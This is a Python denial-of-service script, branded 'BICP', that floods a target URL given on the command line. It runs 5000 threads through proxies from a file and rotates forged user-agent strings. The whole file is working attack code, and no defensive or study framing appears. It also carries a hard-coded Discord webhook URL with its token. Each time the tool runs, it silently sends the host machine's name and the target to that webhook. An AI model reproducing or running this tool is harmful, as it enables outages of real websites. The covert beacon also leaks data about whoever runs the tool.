#OWNER: MD SAMIUL ISLAM
try:
    import urllib.request, os, threading, time, random, sys
    from discord_webhook import DiscordWebhook
    import socket
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install discord_webhook")
    else:
        ("pip install discord_webhook")

usl = "https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm"
useragents = [
      "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.214 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",]   
    
class fucker(threading.Thread):
    
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : random.choice(useragents) }
        self.Lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print("\033[1;31m[BICP] ATTACKING.. [%s]\r"%(self.url))
            
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        self.Lock.release()
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("\033[1;31m[BICP] ATTACKING.. [%s]\r"%(self.url))
                sys.exit(0)
        sys.exit(0)

class MainLoop():

    def home(self):
        global Close, Request, Tot_req
        print \
('''
              
`7MM"""Yp, `7MMF' .g8"""bgd `7MM"""Mq. 
  MM    Yb   MM .dP'     `M   MM   `MM.\033[1;32m𝐏 \033[1;97m
  MM    dP   MM dM'       `   MM   ,M9\033[1;31m 𝐑\033[1;37m
  MM"""bg.   MM MM            MMmmdM9  \033[1;37m𝐎 \033[1;37m 
  MM    `Y   MM MM.           MM     
  MM    ,9   MM `Mb.     ,'   MM        
.JMMmmmd9  .JMML. `"bmmmd'  .JMML.                                       
 \033[1;91m<═════\033[1;41m\033[1;97m THIS NAME IS BICP BRAND\033[;0m\033[1;91m═════>\033[1;92m \033[1;97m
    Tool Method  :   DDOS × ATTACK
    Tool Owner   :   MD SAMIUL ISLAM
''')
        try:
            url = sys.argv[1]
            hst = socket.gethostname()
            webhook = DiscordWebhook(urls='https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm', content=f'{hst} Has Started Flood To {url}')
            response = webhook.execute()
        except:
            pass
        try:
            file_proxy = str("proxy.txt")
            in_file = open(file_proxy,"r")
        except:
            in_file = open(file_proxy,"r")
        num_threads = str(5000)
        if num_threads == "":
            num_threads = int(5000)
        else:
            num_threads = int(num_threads)
        try:
            for i in range(num_threads):
                in_line = in_file.readline()
                fucker(url, i + 1, in_line).start()
                in_line = in_line[:-1]
        except:
            print("Usage: python3 ATTACK.py https://example.com")
        
if __name__ == '__main__':
    if sys.platform.startswith("linux"):
        os.system("clear")
    else:
        ("cls")
    MainLoop().home()
